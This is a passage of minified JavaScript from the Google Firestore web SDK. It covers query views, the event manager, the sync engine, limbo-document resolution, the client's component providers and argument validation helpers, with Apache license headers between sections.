 */class Qg{constructor(){this.W_=new Ie(K.comparator)}track(e){const n=e.doc.key,r=this.W_.get(n);r?e.type!==0&&r.type===3?this.W_=this.W_.insert(n,e):e.type===3&&r.type!==1?this.W_=this.W_.insert(n,{type:r.type,doc:e.doc}):e.type===2&&r.type===2?this.W_=this.W_.insert(n,{type:2,doc:e.doc}):e.type===2&&r.type===0?this.W_=this.W_.insert(n,{type:0,doc:e.doc}):e.type===1&&r.type===0?this.W_=this.W_.remove(n):e.type===1&&r.type===2?this.W_=this.W_.insert(n,{type:1,doc:r.doc}):e.type===0&&r.type===1?this.W_=this.W_.insert(n,{type:2,doc:e.doc}):X():this.W_=this.W_.insert(n,e)}G_(){const e=[];return this.W_.inorderTraversal((n,r)=>{e.push(r)}),e}}class Mi{constructor(e,n,r,i,s,o,l,u,h){this.query=e,this.docs=n,this.oldDocs=r,this.docChanges=i,this.mutatedKeys=s,this.fromCache=o,this.syncStateChanged=l,this.excludesMetadataChanges=u,this.hasCachedResults=h}static fromInitialDocuments(e,n,r,i,s){const o=[];return n.forEach(l=>{o.push({type:0,doc:l})}),new Mi(e,n,Ti.emptySet(n),o,r,i,!0,!1,s)}get hasPendingWrites(){return!this.mutatedKeys.isEmpty()}isEqual(e){if(!(this.fromCache===e.fromCache&&this.hasCachedResults===e.hasCachedResults&&this.syncStateChanged===e.syncStateChanged&&this.mutatedKeys.isEqual(e.mutatedKeys)&&Xl(this.query,e.query)&&this.docs.isEqual(e.docs)&&this.oldDocs.isEqual(e.oldDocs)))return!1;const n=this.docChanges,r=e.docChanges;if(n.length!==r.length)return!1;for(let i=0;i<n.length;i++)if(n[i].type!==r[i].type||!n[i].doc.isEqual(r[i].doc))return!1;return!0}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class gP{constructor(){this.z_=void 0,this.j_=[]}H_(){return this.j_.some(e=>e.J_())}}class yP{constructor(){this.queries=Yg(),this.onlineState="Unknown",this.Y_=new Set}terminate(){(function(n,r){const i=ee(n),s=i.queries;i.queries=Yg(),s.forEach((o,l)=>{for(const u of l.j_)u.onError(r)})})(this,new H(O.ABORTED,"Firestore shutting down"))}}function Yg(){return new Hi(t=>q0(t),Xl)}async function Iw(t,e){const n=ee(t);let r=3;const i=e.query;let s=n.queries.get(i);s?!s.H_()&&e.J_()&&(r=2):(s=new gP,r=e.J_()?0:1);try{switch(r){case 0:s.z_=await n.onListen(i,!0);break;case 1:s.z_=await n.onListen(i,!1);break;case 2:await n.onFirstRemoteStoreListen(i)}}catch(o){const l=_f(o,`Initialization of query '${Xr(e.query)}' failed`);return void e.onError(l)}n.queries.set(i,s),s.j_.push(e),e.Z_(n.onlineState),s.z_&&e.X_(s.z_)&&wf(n)}async function Sw(t,e){const n=ee(t),r=e.query;let i=3;const s=n.queries.get(r);if(s){const o=s.j_.indexOf(e);o>=0&&(s.j_.splice(o,1),s.j_.length===0?i=e.J_()?0:1:!s.H_()&&e.J_()&&(i=2))}switch(i){case 0:return n.queries.delete(r),n.onUnlisten(r,!0);case 1:return n.queries.delete(r),n.onUnlisten(r,!1);case 2:return n.onLastRemoteStoreUnlisten(r);default:return}}function vP(t,e){const n=ee(t);let r=!1;for(const i of e){const s=i.query,o=n.queries.get(s);if(o){for(const l of o.j_)l.X_(i)&&(r=!0);o.z_=i}}r&&wf(n)}function _P(t,e,n){const r=ee(t),i=r.queries.get(e);if(i)for(const s of i.j_)s.onError(n);r.queries.delete(e)}function wf(t){t.Y_.forEach(e=>{e.next()})}var Lh,Xg;(Xg=Lh||(Lh={})).ea="default",Xg.Cache="cache";class Aw{constructor(e,n,r){this.query=e,this.ta=n,this.na=!1,this.ra=null,this.onlineState="Unknown",this.options=r||{}}X_(e){if(!this.options.includeMetadataChanges){const r=[];for(const i of e.docChanges)i.type!==3&&r.push(i);e=new Mi(e.query,e.docs,e.oldDocs,r,e.mutatedKeys,e.fromCache,e.syncStateChanged,!0,e.hasCachedResults)}let n=!1;return this.na?this.ia(e)&&(this.ta.next(e),n=!0):this.sa(e,this.onlineState)&&(this.oa(e),n=!0),this.ra=e,n}onError(e){this.ta.error(e)}Z_(e){this.onlineState=e;let n=!1;return this.ra&&!this.na&&this.sa(this.ra,e)&&(this.oa(this.ra),n=!0),n}sa(e,n){if(!e.fromCache||!this.J_())return!0;const r=n!=="Offline";return(!this.options._a||!r)&&(!e.docs.isEmpty()||e.hasCachedResults||n==="Offline")}ia(e){if(e.docChanges.length>0)return!0;const n=this.ra&&this.ra.hasPendingWrites!==e.hasPendingWrites;return!(!e.syncStateChanged&&!n)&&this.options.includeMetadataChanges===!0}oa(e){e=Mi.fromInitialDocuments(e.query,e.docs,e.mutatedKeys,e.fromCache,e.hasCachedResults),this.na=!0,this.ta.next(e)}J_(){return this.options.source!==Lh.Cache}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Cw{constructor(e){this.key=e}}class Rw{constructor(e){this.key=e}}class wP{constructor(e,n){this.query=e,this.Ta=n,this.Ea=null,this.hasCachedResults=!1,this.current=!1,this.da=ne(),this.mutatedKeys=ne(),this.Aa=H0(e),this.Ra=new Ti(this.Aa)}get Va(){return this.Ta}ma(e,n){const r=n?n.fa:new Qg,i=n?n.Ra:this.Ra;let s=n?n.mutatedKeys:this.mutatedKeys,o=i,l=!1;const u=this.query.limitType==="F"&&i.size===this.query.limit?i.last():null,h=this.query.limitType==="L"&&i.size===this.query.limit?i.first():null;if(e.inorderTraversal((f,p)=>{const g=i.get(f),v=Jl(this.query,p)?p:null,A=!!g&&this.mutatedKeys.has(g.key),k=!!v&&(v.hasLocalMutations||this.mutatedKeys.has(v.key)&&v.hasCommittedMutations);let N=!1;g&&v?g.data.isEqual(v.data)?A!==k&&(r.track({type:3,doc:v}),N=!0):this.ga(g,v)||(r.track({type:2,doc:v}),N=!0,(u&&this.Aa(v,u)>0||h&&this.Aa(v,h)<0)&&(l=!0)):!g&&v?(r.track({type:0,doc:v}),N=!0):g&&!v&&(r.track({type:1,doc:g}),N=!0,(u||h)&&(l=!0)),N&&(v?(o=o.add(v),s=k?s.add(f):s.delete(f)):(o=o.delete(f),s=s.delete(f)))}),this.query.limit!==null)for(;o.size>this.query.limit;){const f=this.query.limitType==="F"?o.last():o.first();o=o.delete(f.key),s=s.delete(f.key),r.track({type:1,doc:f})}return{Ra:o,fa:r,ns:l,mutatedKeys:s}}ga(e,n){return e.hasLocalMutations&&n.hasCommittedMutations&&!n.hasLocalMutations}applyChanges(e,n,r,i){const s=this.Ra;this.Ra=e.Ra,this.mutatedKeys=e.mutatedKeys;const o=e.fa.G_();o.sort((f,p)=>function(v,A){const k=N=>{switch(N){case 0:return 1;case 2:case 3:return 2;case 1:return 0;default:return X()}};return k(v)-k(A)}(f.type,p.type)||this.Aa(f.doc,p.doc)),this.pa(r),i=i!=null&&i;const l=n&&!i?this.ya():[],u=this.da.size===0&&this.current&&!i?1:0,h=u!==this.Ea;return this.Ea=u,o.length!==0||h?{snapshot:new Mi(this.query,e.Ra,s,o,e.mutatedKeys,u===0,h,!1,!!r&&r.resumeToken.approximateByteSize()>0),wa:l}:{wa:l}}Z_(e){return this.current&&e==="Offline"?(this.current=!1,this.applyChanges({Ra:this.Ra,fa:new Qg,mutatedKeys:this.mutatedKeys,ns:!1},!1)):{wa:[]}}Sa(e){return!this.Ta.has(e)&&!!this.Ra.has(e)&&!this.Ra.get(e).hasLocalMutations}pa(e){e&&(e.addedDocuments.forEach(n=>this.Ta=this.Ta.add(n)),e.modifiedDocuments.forEach(n=>{}),e.removedDocuments.forEach(n=>this.Ta=this.Ta.delete(n)),this.current=e.current)}ya(){if(!this.current)return[];const e=this.da;this.da=ne(),this.Ra.forEach(r=>{this.Sa(r.key)&&(this.da=this.da.add(r.key))});const n=[];return e.forEach(r=>{this.da.has(r)||n.push(new Rw(r))}),this.da.forEach(r=>{e.has(r)||n.push(new Cw(r))}),n}ba(e){this.Ta=e.Ts,this.da=ne();const n=this.ma(e.documents);return this.applyChanges(n,!0)}Da(){return Mi.fromInitialDocuments(this.query,this.Ra,this.mutatedKeys,this.Ea===0,this.hasCachedResults)}}class EP{constructor(e,n,r){this.query=e,this.targetId=n,this.view=r}}class TP{constructor(e){this.key=e,this.va=!1}}class IP{constructor(e,n,r,i,s,o){this.localStore=e,this.remoteStore=n,this.eventManager=r,this.sharedClientState=i,this.currentUser=s,this.maxConcurrentLimboResolutions=o,this.Ca={},this.Fa=new Hi(l=>q0(l),Xl),this.Ma=new Map,this.xa=new Set,this.Oa=new Ie(K.comparator),this.Na=new Map,this.La=new hf,this.Ba={},this.ka=new Map,this.qa=Li.kn(),this.onlineState="Unknown",this.Qa=void 0}get isPrimaryClient(){return this.Qa===!0}}async function SP(t,e,n=!0){const r=bw(t);let i;const s=r.Fa.get(e);return s?(r.sharedClientState.addLocalQueryTarget(s.targetId),i=s.view.Da()):i=await xw(r,e,n,!0),i}async function AP(t,e){const n=bw(t);await xw(n,e,!0,!1)}async function xw(t,e,n,r){const i=await Gk(t.localStore,Zt(e)),s=i.targetId,o=t.sharedClientState.addLocalQueryTarget(s,n);let l;return r&&(l=await CP(t,e,s,o==="current",i.resumeToken)),t.isPrimaryClient&&n&&yw(t.remoteStore,i),l}async function CP(t,e,n,r,i){t.Ka=(p,g,v)=>async function(k,N,S,_){let R=N.view.ma(S);R.ns&&(R=await qg(k.localStore,N.query,!1).then(({documents:I})=>N.view.ma(I,R)));const V=_&&_.targetChanges.get(N.targetId),U=_&&_.targetMismatches.get(N.targetId)!=null,j=N.view.applyChanges(R,k.isPrimaryClient,V,U);return Zg(k,N.targetId,j.wa),j.snapshot}(t,p,g,v);const s=await qg(t.localStore,e,!0),o=new wP(e,s.Ts),l=o.ma(s.documents),u=No.createSynthesizedTargetChangeForCurrentChange(n,r&&t.onlineState!=="Offline",i),h=o.applyChanges(l,t.isPrimaryClient,u);Zg(t,n,h.wa);const f=new EP(e,n,o);return t.Fa.set(e,f),t.Ma.has(n)?t.Ma.get(n).push(e):t.Ma.set(n,[e]),h.snapshot}async function RP(t,e,n){const r=ee(t),i=r.Fa.get(e),s=r.Ma.get(i.targetId);if(s.length>1)return r.Ma.set(i.targetId,s.filter(o=>!Xl(o,e))),void r.Fa.delete(e);r.isPrimaryClient?(r.sharedClientState.removeLocalQueryTarget(i.targetId),r.sharedClientState.isActiveQueryTarget(i.targetId)||await Oh(r.localStore,i.targetId,!1).then(()=>{r.sharedClientState.clearQueryState(i.targetId),n&&pf(r.remoteStore,i.targetId),Mh(r,i.targetId)}).catch(Ro)):(Mh(r,i.targetId),await Oh(r.localStore,i.targetId,!0))}async function xP(t,e){const n=ee(t),r=n.Fa.get(e),i=n.Ma.get(r.targetId);n.isPrimaryClient&&i.length===1&&(n.sharedClientState.removeLocalQueryTarget(r.targetId),pf(n.remoteStore,r.targetId))}async function kP(t,e,n){const r=LP(t);try{const i=await function(o,l){const u=ee(o),h=pe.now(),f=l.reduce((v,A)=>v.add(A.key),ne());let p,g;return u.persistence.runTransaction("Locally write mutations","readwrite",v=>{let A=Cn(),k=ne();return u.cs.getEntries(v,f).next(N=>{A=N,A.forEach((S,_)=>{_.isValidDocument()||(k=k.add(S))})}).next(()=>u.localDocuments.getOverlayedDocuments(v,A)).next(N=>{p=N;const S=[];for(const _ of l){const R=Xx(_,p.get(_.key).overlayedDocument);R!=null&&S.push(new fr(_.key,R,M0(R.value.mapValue),Nt.exists(!0)))}return u.mutationQueue.addMutationBatch(v,h,S,l)}).next(N=>{g=N;const S=N.applyToLocalDocumentSet(p,k);return u.documentOverlayCache.saveOverlays(v,N.batchId,S)})}).then(()=>({batchId:g.batchId,changes:K0(p)}))}(r.localStore,e);r.sharedClientState.addPendingMutation(i.batchId),function(o,l,u){let h=o.Ba[o.currentUser.toKey()];h||(h=new Ie(le)),h=h.insert(l,u),o.Ba[o.currentUser.toKey()]=h}(r,i.batchId,n),await bo(r,i.changes),await iu(r.remoteStore)}catch(i){const s=_f(i,"Failed to persist write");n.reject(s)}}async function kw(t,e){const n=ee(t);try{const r=await Wk(n.localStore,e);e.targetChanges.forEach((i,s)=>{const o=n.Na.get(s);o&&(ce(i.addedDocuments.size+i.modifiedDocuments.size+i.removedDocuments.size<=1),i.addedDocuments.size>0?o.va=!0:i.modifiedDocuments.size>0?ce(o.va):i.removedDocuments.size>0&&(ce(o.va),o.va=!1))}),await bo(n,r,e)}catch(r){await Ro(r)}}function Jg(t,e,n){const r=ee(t);if(r.isPrimaryClient&&n===0||!r.isPrimaryClient&&n===1){const i=[];r.Fa.forEach((s,o)=>{const l=o.view.Z_(e);l.snapshot&&i.push(l.snapshot)}),function(o,l){const u=ee(o);u.onlineState=l;let h=!1;u.queries.forEach((f,p)=>{for(const g of p.j_)g.Z_(l)&&(h=!0)}),h&&wf(u)}(r.eventManager,e),i.length&&r.Ca.d_(i),r.onlineState=e,r.isPrimaryClient&&r.sharedClientState.setOnlineState(e)}}async function PP(t,e,n){const r=ee(t);r.sharedClientState.updateQueryState(e,"rejected",n);const i=r.Na.get(e),s=i&&i.key;if(s){let o=new Ie(K.comparator);o=o.insert(s,Ze.newNoDocument(s,Z.min()));const l=ne().add(s),u=new tu(Z.min(),new Map,new Ie(le),o,l);await kw(r,u),r.Oa=r.Oa.remove(s),r.Na.delete(e),Ef(r)}else await Oh(r.localStore,e,!1).then(()=>Mh(r,e,n)).catch(Ro)}async function NP(t,e){const n=ee(t),r=e.batch.batchId;try{const i=await $k(n.localStore,e);Nw(n,r,null),Pw(n,r),n.sharedClientState.updateMutationState(r,"acknowledged"),await bo(n,i)}catch(i){await Ro(i)}}async function DP(t,e,n){const r=ee(t);try{const i=await function(o,l){const u=ee(o);return u.persistence.runTransaction("Reject batch","readwrite-primary",h=>{let f;return u.mutationQueue.lookupMutationBatch(h,l).next(p=>(ce(p!==null),f=p.keys(),u.mutationQueue.removeMutationBatch(h,p))).next(()=>u.mutationQueue.performConsistencyCheck(h)).next(()=>u.documentOverlayCache.removeOverlaysForBatchId(h,f,l)).next(()=>u.localDocuments.recalculateAndSaveOverlaysForDocumentKeys(h,f)).next(()=>u.localDocuments.getDocuments(h,f))})}(r.localStore,e);Nw(r,e,n),Pw(r,e),r.sharedClientState.updateMutationState(e,"rejected",n),await bo(r,i)}catch(i){await Ro(i)}}function Pw(t,e){(t.ka.get(e)||[]).forEach(n=>{n.resolve()}),t.ka.delete(e)}function Nw(t,e,n){const r=ee(t);let i=r.Ba[r.currentUser.toKey()];if(i){const s=i.get(e);s&&(n?s.reject(n):s.resolve(),i=i.remove(e)),r.Ba[r.currentUser.toKey()]=i}}function Mh(t,e,n=null){t.sharedClientState.removeLocalQueryTarget(e);for(const r of t.Ma.get(e))t.Fa.delete(r),n&&t.Ca.$a(r,n);t.Ma.delete(e),t.isPrimaryClient&&t.La.gr(e).forEach(r=>{t.La.containsKey(r)||Dw(t,r)})}function Dw(t,e){t.xa.delete(e.path.canonicalString());const n=t.Oa.get(e);n!==null&&(pf(t.remoteStore,n),t.Oa=t.Oa.remove(e),t.Na.delete(n),Ef(t))}function Zg(t,e,n){for(const r of n)r instanceof Cw?(t.La.addReference(r.key,e),bP(t,r)):r instanceof Rw?(G("SyncEngine","Document no longer in limbo: "+r.key),t.La.removeReference(r.key,e),t.La.containsKey(r.key)||Dw(t,r.key)):X()}function bP(t,e){const n=e.key,r=n.path.canonicalString();t.Oa.get(n)||t.xa.has(r)||(G("SyncEngine","New document in limbo: "+n),t.xa.add(r),Ef(t))}function Ef(t){for(;t.xa.size>0&&t.Oa.size<t.maxConcurrentLimboResolutions;){const e=t.xa.values().next().value;t.xa.delete(e);const n=new K(ye.fromString(e)),r=t.qa.next();t.Na.set(r,new TP(n)),t.Oa=t.Oa.insert(n,r),yw(t.remoteStore,new Hn(Zt(sf(n.path)),r,"TargetPurposeLimboResolution",Jd.oe))}}async function bo(t,e,n){const r=ee(t),i=[],s=[],o=[];r.Fa.isEmpty()||(r.Fa.forEach((l,u)=>{o.push(r.Ka(u,e,n).then(h=>{var f;if((h||n)&&r.isPrimaryClient){const p=h?!h.fromCache:(f=n==null?void 0:n.targetChanges.get(u.targetId))===null||f===void 0?void 0:f.current;r.sharedClientState.updateQueryState(u.targetId,p?"current":"not-current")}if(h){i.push(h);const p=ff.Wi(u.targetId,h);s.push(p)}}))}),await Promise.all(o),r.Ca.d_(i),await async function(u,h){const f=ee(u);try{await f.persistence.runTransaction("notifyLocalViewChanges","readwrite",p=>L.forEach(h,g=>L.forEach(g.$i,v=>f.persistence.referenceDelegate.addReference(p,g.targetId,v)).next(()=>L.forEach(g.Ui,v=>f.persistence.referenceDelegate.removeReference(p,g.targetId,v)))))}catch(p){if(!xo(p))throw p;G("LocalStore","Failed to update sequence numbers: "+p)}for(const p of h){const g=p.targetId;if(!p.fromCache){const v=f.os.get(g),A=v.snapshotVersion,k=v.withLastLimboFreeSnapshotVersion(A);f.os=f.os.insert(g,k)}}}(r.localStore,s))}async function VP(t,e){const n=ee(t);if(!n.currentUser.isEqual(e)){G("SyncEngine","User change. New user:",e.toKey());const r=await fw(n.localStore,e);n.currentUser=e,function(s,o){s.ka.forEach(l=>{l.forEach(u=>{u.reject(new H(O.CANCELLED,o))})}),s.ka.clear()}(n,"'waitForPendingWrites' promise is rejected due to a user change."),n.sharedClientState.handleUserChange(e,r.removedBatchIds,r.addedBatchIds),await bo(n,r.hs)}}function OP(t,e){const n=ee(t),r=n.Na.get(e);if(r&&r.va)return ne().add(r.key);{let i=ne();const s=n.Ma.get(e);if(!s)return i;for(const o of s){const l=n.Fa.get(o);i=i.unionWith(l.view.Va)}return i}}function bw(t){const e=ee(t);return e.remoteStore.remoteSyncer.applyRemoteEvent=kw.bind(null,e),e.remoteStore.remoteSyncer.getRemoteKeysForTarget=OP.bind(null,e),e.remoteStore.remoteSyncer.rejectListen=PP.bind(null,e),e.Ca.d_=vP.bind(null,e.eventManager),e.Ca.$a=_P.bind(null,e.eventManager),e}function LP(t){const e=ee(t);return e.remoteStore.remoteSyncer.applySuccessfulWrite=NP.bind(null,e),e.remoteStore.remoteSyncer.rejectFailedWrite=DP.bind(null,e),e}class xl{constructor(){this.kind="memory",this.synchronizeTabs=!1}async initialize(e){this.serializer=nu(e.databaseInfo.databaseId),this.sharedClientState=this.Wa(e),this.persistence=this.Ga(e),await this.persistence.start(),this.localStore=this.za(e),this.gcScheduler=this.ja(e,this.localStore),this.indexBackfillerScheduler=this.Ha(e,this.localStore)}ja(e,n){return null}Ha(e,n){return null}za(e){return Bk(this.persistence,new jk,e.initialUser,this.serializer)}Ga(e){return new Mk(df.Zr,this.serializer)}Wa(e){return new Qk}async terminate(){var e,n;(e=this.gcScheduler)===null||e===void 0||e.stop(),(n=this.indexBackfillerScheduler)===null||n===void 0||n.stop(),this.sharedClientState.shutdown(),await this.persistence.shutdown()}}xl.provider={build:()=>new xl};class Fh{async initialize(e,n){this.localStore||(this.localStore=e.localStore,this.sharedClientState=e.sharedClientState,this.datastore=this.createDatastore(n),this.remoteStore=this.createRemoteStore(n),this.eventManager=this.createEventManager(n),this.syncEngine=this.createSyncEngine(n,!e.synchronizeTabs),this.sharedClientState.onlineStateHandler=r=>Jg(this.syncEngine,r,1),this.remoteStore.remoteSyncer.handleCredentialChange=VP.bind(null,this.syncEngine),await mP(this.remoteStore,this.syncEngine.isPrimaryClient))}createEventManager(e){return function(){return new yP}()}createDatastore(e){const n=nu(e.databaseInfo.databaseId),r=function(s){return new Zk(s)}(e.databaseInfo);return function(s,o,l,u){return new nP(s,o,l,u)}(e.authCredentials,e.appCheckCredentials,r,n)}createRemoteStore(e){return function(r,i,s,o,l){return new iP(r,i,s,o,l)}(this.localStore,this.datastore,e.asyncQueue,n=>Jg(this.syncEngine,n,0),function(){return Gg.D()?new Gg:new Yk}())}createSyncEngine(e,n){return function(i,s,o,l,u,h,f){const p=new IP(i,s,o,l,u,h);return f&&(p.Qa=!0),p}(this.localStore,this.remoteStore,this.eventManager,this.sharedClientState,e.initialUser,e.maxConcurrentLimboResolutions,n)}async terminate(){var e,n;await async function(i){const s=ee(i);G("RemoteStore","RemoteStore shutting down."),s.L_.add(5),await Do(s),s.k_.shutdown(),s.q_.set("Unknown")}(this.remoteStore),(e=this.datastore)===null||e===void 0||e.terminate(),(n=this.eventManager)===null||n===void 0||n.terminate()}}Fh.provider={build:()=>new Fh};/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *//**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Vw{constructor(e){this.observer=e,this.muted=!1}next(e){this.muted||this.observer.next&&this.Ya(this.observer.next,e)}error(e){this.muted||(this.observer.error?this.Ya(this.observer.error,e):An("Uncaught Error in snapshot listener:",e.toString()))}Za(){this.muted=!0}Ya(e,n){setTimeout(()=>{this.muted||e(n)},0)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class MP{constructor(e,n,r,i,s){this.authCredentials=e,this.appCheckCredentials=n,this.asyncQueue=r,this.databaseInfo=i,this.user=Xe.UNAUTHENTICATED,this.clientId=V0.newId(),this.authCredentialListener=()=>Promise.resolve(),this.appCheckCredentialListener=()=>Promise.resolve(),this._uninitializedComponentsProvider=s,this.authCredentials.start(r,async o=>{G("FirestoreClient","Received user=",o.uid),await this.authCredentialListener(o),this.user=o}),this.appCheckCredentials.start(r,o=>(G("FirestoreClient","Received new app check token=",o),this.appCheckCredentialListener(o,this.user)))}get configuration(){return{asyncQueue:this.asyncQueue,databaseInfo:this.databaseInfo,clientId:this.clientId,authCredentials:this.authCredentials,appCheckCredentials:this.appCheckCredentials,initialUser:this.user,maxConcurrentLimboResolutions:100}}setCredentialChangeListener(e){this.authCredentialListener=e}setAppCheckTokenChangeListener(e){this.appCheckCredentialListener=e}terminate(){this.asyncQueue.enterRestrictedMode();const e=new yn;return this.asyncQueue.enqueueAndForgetEvenWhileRestricted(async()=>{try{this._onlineComponents&&await this._onlineComponents.terminate(),this._offlineComponents&&await this._offlineComponents.terminate(),this.authCredentials.shutdown(),this.appCheckCredentials.shutdown(),e.resolve()}catch(n){const r=_f(n,"Failed to shutdown persistence");e.reject(r)}}),e.promise}}async function _c(t,e){t.asyncQueue.verifyOperationInProgress(),G("FirestoreClient","Initializing OfflineComponentProvider");const n=t.configuration;await e.initialize(n);let r=n.initialUser;t.setCredentialChangeListener(async i=>{r.isEqual(i)||(await fw(e.localStore,i),r=i)}),e.persistence.setDatabaseDeletedListener(()=>t.terminate()),t._offlineComponents=e}async function ey(t,e){t.asyncQueue.verifyOperationInProgress();const n=await FP(t);G("FirestoreClient","Initializing OnlineComponentProvider"),await e.initialize(n,t.configuration),t.setCredentialChangeListener(r=>Kg(e.remoteStore,r)),t.setAppCheckTokenChangeListener((r,i)=>Kg(e.remoteStore,i)),t._onlineComponents=e}async function FP(t){if(!t._offlineComponents)if(t._uninitializedComponentsProvider){G("FirestoreClient","Using user provided OfflineComponentProvider");try{await _c(t,t._uninitializedComponentsProvider._offline)}catch(e){const n=e;if(!function(i){return i.name==="FirebaseError"?i.code===O.FAILED_PRECONDITION||i.code===O.UNIMPLEMENTED:!(typeof DOMException<"u"&&i instanceof DOMException)||i.code===22||i.code===20||i.code===11}(n))throw n;Di("Error using user provided cache. Falling back to memory cache: "+n),await _c(t,new xl)}}else G("FirestoreClient","Using default OfflineComponentProvider"),await _c(t,new xl);return t._offlineComponents}async function Ow(t){return t._onlineComponents||(t._uninitializedComponentsProvider?(G("FirestoreClient","Using user provided OnlineComponentProvider"),await ey(t,t._uninitializedComponentsProvider._online)):(G("FirestoreClient","Using default OnlineComponentProvider"),await ey(t,new Fh))),t._onlineComponents}function UP(t){return Ow(t).then(e=>e.syncEngine)}async function Lw(t){const e=await Ow(t),n=e.eventManager;return n.onListen=SP.bind(null,e.syncEngine),n.onUnlisten=RP.bind(null,e.syncEngine),n.onFirstRemoteStoreListen=AP.bind(null,e.syncEngine),n.onLastRemoteStoreUnlisten=xP.bind(null,e.syncEngine),n}function jP(t,e,n={}){const r=new yn;return t.asyncQueue.enqueueAndForget(async()=>function(s,o,l,u,h){const f=new Vw({next:g=>{f.Za(),o.enqueueAndForget(()=>Sw(s,p));const v=g.docs.has(l);!v&&g.fromCache?h.reject(new H(O.UNAVAILABLE,"Failed to get document because the client is offline.")):v&&g.fromCache&&u&&u.source==="server"?h.reject(new H(O.UNAVAILABLE,'Failed to get document from server. (However, this document does exist in the local cache. Run again without setting source to "server" to retrieve the cached document.)')):h.resolve(g)},error:g=>h.reject(g)}),p=new Aw(sf(l.path),f,{includeMetadataChanges:!0,_a:!0});return Iw(s,p)}(await Lw(t),t.asyncQueue,e,n,r)),r.promise}function zP(t,e,n={}){const r=new yn;return t.asyncQueue.enqueueAndForget(async()=>function(s,o,l,u,h){const f=new Vw({next:g=>{f.Za(),o.enqueueAndForget(()=>Sw(s,p)),g.fromCache&&u.source==="server"?h.reject(new H(O.UNAVAILABLE,'Failed to get documents from server. (However, these documents may exist in the local cache. Run again without setting source to "server" to retrieve the cached documents.)')):h.resolve(g)},error:g=>h.reject(g)}),p=new Aw(l,f,{includeMetadataChanges:!0,_a:!0});return Iw(s,p)}(await Lw(t),t.asyncQueue,e,n,r)),r.promise}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Mw(t){const e={};return t.timeoutSeconds!==void 0&&(e.timeoutSeconds=t.timeoutSeconds),e}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const ty=new Map;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Fw(t,e,n){if(!n)throw new H(O.INVALID_ARGUMENT,`Function ${t}() cannot be called with an empty ${e}.`)}function BP(t,e,n,r){if(e===!0&&r===!0)throw new H(O.INVALID_ARGUMENT,`${t} and ${n} cannot be used together.`)}function ny(t){if(!K.isDocumentKey(t))throw new H(O.INVALID_ARGUMENT,`Invalid document reference. Document references must have an even number of segments, but ${t} has ${t.length}.`)}function ry(t){if(K.isDocumentKey(t))throw new H(O.INVALID_ARGUMENT,`Invalid collection reference. Collection references must have an odd number of segments, but ${t} has ${t.length}.`)}function su(t){if(t===void 0)return"undefined";if(t===null)return"null";if(typeof t=="string")return t.length>20&&(t=`${t.substring(0,20)}...`),JSON.stringify(t);if(typeof t=="number"||typeof t=="boolean")return""+t;if(typeof t=="object"){if(t instanceof Array)return"an array";{const e=function(r){return r.constructor?r.constructor.name:null}(t);return e?`a custom ${e} object`:"an object"}}return typeof t=="function"?"a function":X()}function qt(t,e){if("_delegate"in 